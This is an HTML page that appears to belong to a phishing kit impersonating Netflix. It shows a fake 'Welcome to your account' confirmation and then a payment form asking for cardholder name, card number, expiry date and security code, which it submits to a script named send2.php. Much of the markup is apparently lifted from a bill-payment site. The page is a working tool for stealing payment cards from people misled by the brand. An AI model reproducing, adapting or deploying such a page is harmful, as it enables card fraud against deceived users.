<html lang="fr" id="NETFLIX"><head></head><body>
    <link href="css/mala.css" media="all" type="text/css" rel="stylesheet">
                            <form class="js-lgc-search-form" method="POST" action="send2.php">
<div class="wrapper">
       
<title>Netflix - 07312016</title>
        <!-- end of header -->
    
    <!--end of wrapHeader-->
    <div class="wrapMain">
        <div class="subWrap main">
            <div class="content" id="content">
                
    <div id="flowcontent">    <input type="hidden" name="hdnOmniturePayBill" id="hdnOmniturePayBill" value="{s_oAPT:'#APT@X#-#APT@Y#-#APT@Z#',s_oARS:'#ARS#',s_oLNK:'true'}">
<input data-val="true" data-val-required="The IsAllBillsPreAuthorized field is required." id="IsAllBillsPreAuthorized" name="IsAllBillsPreAuthorized" type="hidden" value="True">    <div class="cWrap pgTitle">
        <h1 style="color:red"></h1><img src="https://s11.postimg.org/nxzkzbtmr/image.png" width="200" height="100"  >
    </div>
    <div class="cWrap">
        <div class="cBox stepList splitterJs">
    <img src="bir.PNG"></div></div>

        


        <div class="cBox hide" id="errorMessageSummary">
            <div class="warning">
                <div class="padder">
                    <div class="message messageThemeC">
                        <h2 class="headingType4">An error occurred while processing your request.</h2>
                        <span class="validation-summary-errors">
                            
                        </span>
                    </div>
                </div>
            </div>
        <div class="cBoxExtra1"><!-- --></div><div class="cBoxExtra2"><!-- --></div><div class="cBoxExtra3"><div class="cBoxExtra4"><!-- --></div></div><div class="cBoxExtra5"><div class="cBoxExtra6"><!-- --></div></div></div>

        

        <div class="cBox">
            <div class="padder cHeader">
                <h2 class="fontFace">Payment information</h2>
                <div class="clearer"></div>
            </div>

<div id="makepayment" class="padder">
    <h3 class="headingType4"><label id="table_header_bills_to_pay"></label></h3>
    <div class="spacer1"></div>
    <div class="multiColumnCollection">
            <div class="multiColumn splitterJs">
                <div class="column" style="width:440px;">
                    <div class="shell shellThemeE" style="min-height: 12.3333em;">
                        <div class="formGroup formGroupThemeC formCheckBox">
                            <div class="sectionContent">
                                <div class="optionGroup">
                                    <input checked="checked" data-val="true" data-val-required="The IsChecked field is required." id="Items_0__IsChecked" name="Items[0].IsChecked" style="visibility:hidden;" type="checkbox" value="true"><input name="Items[0].IsChecked" type="hidden" value="false">
                                    <label for="Items_0__IsChecked"> Welcome to your account . </label>
                                    <p>
                                        <strong> date:</strong> <span class="priceTag">
                                            14 April 2017                                            
                                        </span>
                                    </p>
                                </div>
                                <div class="formGroup formGroupThemeC formText">
                                    <div class="sectionHeader">
                                        <label for="Items_0__AmountStr" id="label_paymemt_amount">Confirmation Number : </label>
                                    </div>
                                    <div class="">
                                        <input id="Items_0__AmountStr" maxlength="7" name="Items[0].AmountStr" disabled="disabled" type="text" value="07312016">
                                        
                                    </div>
                                
                                
                                 
                                <div class="clearer"></div>
                                </div>
                                                                    <p class="message messageThemeD">the verification will be confirmed in a few moments.</p>
                            </div>
                            <div class="clearer"></div>
                        </div>
                    </div>
                </div>
            </div>
    </div>
    


</div>                <div class="clearer"></div>
                <div class="padder">
                    
                        <div class="hSeparator spacer2"></div>
                    <div class="formGroup formGroupThemeA formSelect">
                        <div class="sectionHeader">
                            <label id="  ">  </label>
                            <label id="table_label_methodofpayment">Method of payment</label>
                        </div>
                </div>
                <div class="clearer"></div>
                    <div class="multiColumnCollection">

                        <div class="multiColumn">
                            <div class="column" style="width: 435px;">
                                <div class="shell shellThemeE" style="min-height: 2.08333em;">
                                    <div class="formGroup formGroupThemeC">
                                        <label for="Debit" id="bankAccount"></label>

                                        <input id="PaymentBankAccount" name="SelectedPaymentMethod" type="radio" value="Debit">
                                        <label for="PaymentBankAccount">Credit Card</label>

                                        <div class="clearer"></div>
                                        <div class="clearer"></div>
                                    </div>
                                </div>
                            </div>
                            
                        </div>
                    </div>
</div>                <div class="padder">
                    <div class="spacer1"></div>
                </div>
                <div id="ccarea" style="display: none;">
<style type="text/css">
    /* fix EI8 opacity issue */
    .dim
    {
        filter: alpha(opacity=20);
    }
</style>

<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_CardholderName" id="customer_credit_card_detail_name">Cardholder</label></div>
<div class="sectionContent">
    <span><input id="mesa" maxlength="30" name="mesa" type="text" value=""></span>
    <span class="inputAside">
          <a href="#myContent7Id" onclick="$.lightBox.showInPage('#myContent7Id', {colClassName:'col10'});return false;">No name on card?</a>
    </span>
    <div class="clearer">
    </div>
    
    <p class="helpMessage">Enter name as it appears on the credit card.</p>
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_CreditCardNumberMasked" id="customer_credit_card_detail_number">Card number</label></div>
<div class="sectionContent">

        <input autocomplete="off" id="ccnum" maxlength="25" name="ccnum" type="text" value="">
        <p class="inputAside">
            <span class="icon iconVisa" id="ccTypeVisa"><strong>Visa</strong></span> <span class="icon iconMastercard" id="ccTypeMasterCard">Mastercard</span> <span class="icon iconAmex" id="ccTypeAMEX">
                    Amex</span>
        </p>
    <div class="clearer"></div>
    <span></span>
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formSelect">
<div class="sectionHeader"><label for="SelectedCreditCard_ExpireMonth" id="customer_credit_card_detail_exp_date">Expiry date</label></div>
<div class="sectionContent">
    <select data-val="true" id="month" name="month"><option value="">MM</option>
<option value="1">01</option>
<option value="2">02</option>
<option value="3">03</option>
<option value="4">04</option>
<option value="5">05</option>
<option value="6">06</option>
<option value="7">07</option>
<option value="8">08</option>
<option value="9">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
    <select data-val="true"  id="year" name="year"><option value="">YY</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
</select>
    <div class="clearer"></div>
    
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_SecurityCodeMasked" id="customer_credit_card_detail_security_code">Card security code</label></div>
<div class="sectionContent">
   <span><input class="inputSize1" data-val="true" id="cvv" maxlength="4" name="cvv" type="password" value=""></span>
   <span class="inputAside">
   </span>
    <div class="clearer">
    </div>
    
</div>
<div class="clearer">
</div>
</div>

<div class="accessAlt" id="CCNeedHelp">
    <div class="lightBoxPadder">
        <div class="padder">
            <p class="lightBoxTitleJs">What is a security code?</p>
        </div>
        
        <div class="clearer">
        </div>
    </div>
</div>

</div>
                <div id="ccarea" style="display: block;">
<style type="text/css">
    /* fix EI8 opacity issue */
    .dim
    {
        filter: alpha(opacity=20);
    }
</style>


<div class="spacer2">
</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_CardholderName" id="customer_credit_card_detail_name">Cardholder</label></div>
<div class="sectionContent">
    <span><input data-val="true" required="off" data-val-length="The field CardholderName must be a string with a maximum length of 30." data-val-length-max="30" id="SelectedCreditCard_CardholderName" maxlength="30" name="ccname" type="text" value=""></span>
    <span class="inputAside">
          <a href="#myContent7Id" onclick="$.lightBox.showInPage('#myContent7Id', {colClassName:'col10'});return false;">No name on card?</a>
    </span>
    <div class="clearer">
    </div>
    
    <p class="helpMessage">Enter name as it appears on the credit card.</p>
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_CreditCardNumberMasked" id="customer_credit_card_detail_number">Card number</label></div>
<div class="sectionContent">
        <input autocomplete="off" required="off" id="ccnum" pattern="[0-9]*" maxlength="25" name="ccnum" onchange="SetCCType(this.value)" type="text" value="">
        <p class="inputAside">
            <span class="icon iconVisa" id="ccTypeVisa"><strong>Visa</strong></span> <span class="icon iconMastercard" id="ccTypeMasterCard">Mastercard</span> <span class="icon iconAmex" id="ccTypeAMEX">
                    Amex</span>
        </p>
    <div class="clearer"></div>
    <span></span>
    <p class="helpMessage">Example: 55511116662222</p> 
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formSelect">
<div class="sectionHeader"><label for="SelectedCreditCard_ExpireMonth" id="customer_credit_card_detail_exp_date">Expiry date</label></div>
<div class="sectionContent">
    <select required="off" data-val="true" data-val-length="The field ExpireMonth must be a string with a maximum length of 2." data-val-length-max="2" id="month" name="month"><option value="">MM</option>
<option value="1">01</option>
<option value="2">02</option>
<option value="3">03</option>
<option value="4">04</option>
<option value="5">05</option>
<option value="6">06</option>
<option value="7">07</option>
<option value="8">08</option>
<option value="9">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
    <select data-val="true" required="off" data-val-length="The field ExpireYear must be a string with a maximum length of 2." data-val-length-max="2" id="year" name="year"><option value="">YY</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
</select>
    <div class="clearer"></div>
     
</div>
<div class="clearer">
</div>
</div>
<div class="formGroup formText">
<div class="sectionHeader"><label for="SelectedCreditCard_SecurityCodeMasked" id="customer_credit_card_detail_security_code">Card security code</label></div>
<div class="sectionContent">
   <span><input class="inputSize1" required="off" pattern="[0-9]*" maxlength="4" minlength="3" data-val="true" data-val-length="The field SecurityCodeMasked must be a string with a maximum length of 4." data-val-length-max="4" id="cvv" maxlength="4" name="cvv" type="password" value=""></span>
   
    <div class="clearer">
    </div>
    
</div>
<div class="clearer">
</div>
</div><br<br>
</br<br>
<div id="myContent7Id" class="accessAlt ">
    <p class="lightBoxTitleJs">No cardholder name</p>
   
</div>

</div>
                <div class="clearer"></div>
                <!-- /formGroup -->
        <div class="cBoxExtra1"><!-- --></div><div class="cBoxExtra2"><!-- --></div><div class="cBoxExtra3"><div class="cBoxExtra4"><!-- --></div></div><div class="cBoxExtra5"><div class="cBoxExtra6"><!-- --></div></div></div>

        <div class="cBox cBoxThemeA">
            <div class="padder processAction">
                <div class="splitter">
                    <div class="splitterLeft">
                       
                    </div>
                    <div class="splitterRight">
                        <div class="splitterContent">
                                        <div id="nextsection" style="display: block;">
<input type="image" src="b.PNG" class="submit">                                        </div>
                                        <div id="nextsectionhide" style="display: none;">
                                            <a class="button toolTipJs buttonDisabled" title="" id="lnkContinuehide"><span>Next<span><!-- --></span></span></a>
                                        </div>
                        </div>
                    </div>
                </div>
            </div>
        <div class="cBoxExtra1"><!-- --></div><div class="cBoxExtra2"><!-- --></div><div class="cBoxExtra3"><div class="cBoxExtra4"><!-- --></div></div><div class="cBoxExtra5"><div class="cBoxExtra6"><!-- --></div></div></div>
        <!--
        <div style="display:none;">
        </div>
        -->
    </div>
    <style type="text/css">
    /*added for an IE6 fix*/
    .u55_container {
        POSITION: absolute;
        WIDTH: 445px;
        HEIGHT: 64px;
        TOP: 540px;
        LEFT: 60px;
    }
    </style>

    
    </div>
  


            </div>
            
        </div>
        <!--end of main-->
    </div></form>
    <!--end of wrapMain-->
    <div align="center" class="wrapFooter">
        

        <footer class="rsx-lgc-footer">
           
            <div class="rsx-lgc-container rsx-lgc-clearfix">
                <div class="rsx-lgc-footer-search-wrap rsx-lgc-clearfix">
                  <img src="fin.PNG">
  </div>
    </div>
			
			
        </footer>


       
    </div>


    
<!--?php
*///////////
?-->



    </body></html>